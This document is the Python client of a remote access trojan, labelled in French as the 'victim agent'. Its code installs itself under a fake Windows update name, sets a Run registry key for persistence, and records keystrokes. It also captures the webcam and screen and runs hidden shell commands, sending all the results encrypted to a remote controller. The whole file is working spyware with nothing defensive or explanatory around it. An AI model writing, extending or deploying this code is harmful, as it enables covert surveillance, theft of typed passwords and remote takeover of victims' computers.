# rat/client.py — agent victime
# pip install pycryptodome opencv-python pynput mss pillow
import asyncio, json, base64, os, sys, subprocess, shutil
import cv2, mss
from PIL import Image
from io import BytesIO
from pynput import keyboard
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import winreg
from rat.config import KEY, HOST, PORT

def encrypt(data: bytes) -> bytes:
    iv = os.urandom(16)
    c  = AES.new(KEY, AES.MODE_CBC, iv)
    return base64.b64encode(iv + c.encrypt(pad(data, 16)))

def decrypt(data: bytes) -> bytes:
    raw = base64.b64decode(data)
    iv, ct = raw[:16], raw[16:]
    c = AES.new(KEY, AES.MODE_CBC, iv)
    return unpad(c.decrypt(ct), 16)

def persist():
    exe = sys.executable if getattr(sys,'frozen',False) else os.path.abspath(__file__)
    dst = os.path.join(os.getenv("APPDATA","."),"WinUpdateSvc.exe")
    if not os.path.exists(dst):
        shutil.copy2(exe, dst)
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k,"WinUpdateSvc",0,winreg.REG_SZ,dst)
        winreg.CloseKey(k)
    except Exception: pass

buf: list[str] = []

def on_press(key):
    try:    buf.append(key.char or '')
    except: buf.append(f'[{key.name}]')

def start_kl():
    from pynput.keyboard import Listener
    Listener(on_press=on_press, daemon=True).start()

def grab_cam() -> str:
    cap = cv2.VideoCapture(0)
    ok, frame = cap.read(); cap.release()
    if not ok: return ""
    _, b = cv2.imencode('.jpg', frame)
    return base64.b64encode(b.tobytes()).decode()

def grab_screen() -> str:
    with mss.mss() as s:
        shot = s.grab(s.monitors[1])
        img  = Image.frombytes("RGB", shot.size, shot.bgra, "raw","BGRX")
        io   = BytesIO(); img.save(io, "PNG")
        return base64.b64encode(io.getvalue()).decode()

def shell(cmd: str) -> str:
    try:
        return subprocess.check_output(cmd, shell=True,
            stderr=subprocess.STDOUT, timeout=15,
            creationflags=subprocess.CREATE_NO_WINDOW).decode(errors='replace')
    except subprocess.CalledProcessError as e: return e.output.decode(errors='replace')
    except Exception as e: return str(e)

async def send(w: asyncio.StreamWriter, msg: dict):
    d = encrypt(json.dumps(msg).encode())
    w.write(len(d).to_bytes(4,'big') + d); await w.drain()

async def kl_loop(w: asyncio.StreamWriter):
    while True:
        await asyncio.sleep(10)
        if buf:
            await send(w, {"type":"keylog","data":''.join(buf)}); buf.clear()

async def _main():
    persist(); start_kl()
    while True:
        try:
            r, w = await asyncio.open_connection(HOST, PORT)
            asyncio.create_task(kl_loop(w))
            while True:
                n   = int.from_bytes(await r.readexactly(4),'big')
                msg = json.loads(decrypt(await r.readexactly(n)))
                match msg.get("type"):
                    case "shell":      await send(w,{"type":"shell_out","data":shell(msg["cmd"])})
                    case "screenshot": await send(w,{"type":"screenshot","data":grab_screen()})
                    case "cam":        await send(w,{"type":"cam","data":grab_cam()})
        except Exception: await asyncio.sleep(10)

def run():
    asyncio.run(_main())